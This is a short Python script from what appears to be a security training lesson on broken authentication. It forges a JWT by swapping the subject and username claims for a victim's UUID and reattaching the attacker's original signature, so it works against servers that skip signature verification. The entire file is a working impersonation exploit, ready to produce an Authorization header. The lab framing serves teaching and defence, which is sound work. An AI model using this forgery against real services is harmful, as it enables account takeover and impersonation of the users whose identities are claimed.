#!/usr/bin/env python3
"""
Lesson 02 — Broken Authentication (JWT forgery)

Forges a JWT by:
  1. Splitting the attacker's legitimate token (header.payload.signature)
  2. Decoding the base64url payload
  3. Replacing 'sub' and 'username' with the victim's UUID
  4. Re-encoding the payload
  5. Reattaching the attacker's original (now mathematically invalid)
     signature

Because the vulnerable Lambda never verifies the signature against
Cognito's JWKS, the server still trusts the forged identity claims.

Usage:
    python3 lesson02_forge_jwt.py <ATTACKER_TOKEN> <VICTIM_UUID>

Output: the forged JWT, ready to send as the Authorization header.
"""

import base64
import json
import sys


def b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def forge(attacker_token: str, victim_uuid: str) -> str:
    header_b64, payload_b64, signature = attacker_token.split(".")
    payload = json.loads(b64url_decode(payload_b64))

    print("Original payload:")
    print(json.dumps(payload, indent=2))

    payload["sub"] = victim_uuid
    payload["username"] = victim_uuid

    new_payload_b64 = b64url_encode(
        json.dumps(payload, separators=(",", ":")).encode()
    )

    print("\nForged payload (now claims to be the victim):")
    print(json.dumps(payload, indent=2))

    return f"{header_b64}.{new_payload_b64}.{signature}"


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 lesson02_forge_jwt.py <ATTACKER_TOKEN> <VICTIM_UUID>")
        sys.exit(1)

    forged_token = forge(sys.argv[1], sys.argv[2])
    print(f"\n=== FORGED TOKEN ===\n{forged_token}")
